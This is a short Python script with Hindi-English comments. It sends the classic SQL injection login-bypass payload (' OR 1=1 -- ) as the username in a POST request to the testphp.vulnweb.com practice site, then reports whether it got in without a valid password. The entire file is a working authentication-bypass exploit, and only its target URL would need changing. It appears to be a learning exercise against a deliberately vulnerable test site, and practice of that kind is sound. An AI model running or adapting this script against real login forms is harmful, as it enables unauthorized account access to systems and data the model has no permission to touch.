import requests
import sys

def test_auth_bypass(url):
    print(f"\n[*] Bhai, targeting login form at: {url}")
    
    # The Classic SQLi Auth Bypass payload
    payload = "' OR 1=1 -- "
    
    # POST requests data ko dictionary (key-value pair) mein bhejti hain.
    # Note: Humari test website (testphp) form parameters ke liye 'uname' aur 'pass' use karti hai.
    data = {
        "uname": payload,
        "pass": "kuch_bhi_password"
    }
    
    print(f"[*] Sending malicious POST payload: {data['uname']}")
    
    try:
        # Dhyan do Bhai: Yahan requests.get() nahi, requests.post() use kar rahe hain!
        response = requests.post(url, data=data, timeout=10)
        
        # Check kar rahe hain ki kya server ne hume andar aane diya
        if "Logout" in response.text or "Welcome" in response.text:
            print("\n[+] BOOM! 🎯 SQLi Authentication Bypass Successful!")
            print("[+] Bhai, hum bina valid password ke login ho gaye!")
        else:
            print("\n[-] Login failed. Ya toh target secure hai, ya form ke parameter names (uname/pass) alag hain.")
            
    except requests.exceptions.RequestException as e:
        print(f"\n[!] Arre yaar, Connection failed: {e}")

if __name__ == "__main__":
    # TestPHP ki actual file jo login process karti hai
    target_url = "http://testphp.vulnweb.com/userinfo.php"
    test_auth_bypass(target_url)
